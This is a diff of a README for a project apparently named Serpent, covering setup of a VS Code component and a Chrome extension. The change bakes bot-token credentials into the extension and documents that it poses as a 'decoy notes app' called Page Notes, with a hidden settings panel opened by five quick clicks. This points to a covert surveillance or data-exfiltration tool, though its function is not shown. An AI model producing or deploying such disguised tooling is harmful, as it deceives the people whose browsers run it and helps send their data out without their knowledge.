@@ -39,10 +39,19 @@ The `.env` hot-reloads on save.
 
 ### 3. Browser Extension (Chrome)
 
+Bake in your credentials (reads from `.env`):
+
+```sh
+node browser-extension/build.js
+```
+
+Then load the extension:
+
 1. Go to `chrome://extensions`
 2. Enable **Developer mode**
 3. Click **Load unpacked** > select the `browser-extension/` folder
-4. Click the Serpent icon in the toolbar > enter your bot token and chat ID
+
+The extension appears as **Page Notes** (a decoy notes app). To change credentials later, click the title 5 times quickly to access the config panel.
 
 ## What It Does
 
@@ -63,7 +72,7 @@ The `.env` hot-reloads on save.
 
 ## Configuration
 
-All settings go in `.env` (VS Code) or the extension popup (browser):
+VS Code reads from `.env`. Browser extension uses hardcoded credentials (via `build.js`) or the hidden config panel (5x click title):
 
 | Variable | Default | Description |
 |---|---|---|
